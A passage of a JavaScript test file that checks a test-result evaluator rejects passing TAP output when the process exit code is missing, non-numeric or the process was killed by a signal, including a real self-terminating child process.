    assert.equal(evaluateExecution({ testContract: testContractFixture(), run: { exitCode: 0, output: result.stdout } }).verdict, 'reject');
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('missing or signalled process exit cannot authenticate a passing TAP report', () => {
  for (const run of [
    { output: TAP_PASS },
    { exitCode: null, output: TAP_PASS },
    { exitCode: 0, signal: 'SIGTERM', output: TAP_PASS },
    { exitCode: 1, signal: 'SIGKILL', output: TAP_BEHAVIOR_RED },
    { exitCode: '0', output: TAP_PASS },
  ]) {
    assert.equal(classifyRunOutcome(run).kind, 'environment-failure');
    assert.equal(evaluateExecution({ testContract: testContractFixture(), run }).verdict, 'reject');
    assert.equal(requireValidRed(run).ok, false);
  }
  assert.equal(classifyRunOutcome({ exitCode: 0, output: TAP_PASS }).kind, 'pass');
});

test('a real process killed after writing passing TAP is not accepted', () => {
  const child = spawnSync(process.execPath, ['-e', `process.stdout.write(${JSON.stringify(TAP_PASS)}, () => process.kill(process.pid, 'SIGTERM'));`], { encoding: 'utf8', timeout: 10000 });
  assert.equal(child.status, null);
  assert.equal(child.signal, 'SIGTERM');
  assert.equal(child.stdout, TAP_PASS);
  const run = { exitCode: child.status, signal: child.signal, output: child.stdout, spawnError: child.error };
  assert.equal(classifyRunOutcome(run).kind, 'environment-failure');
  assert.equal(evaluateExecution({ testContract: testContractFixture(), run }).verdict, 'reject');
});
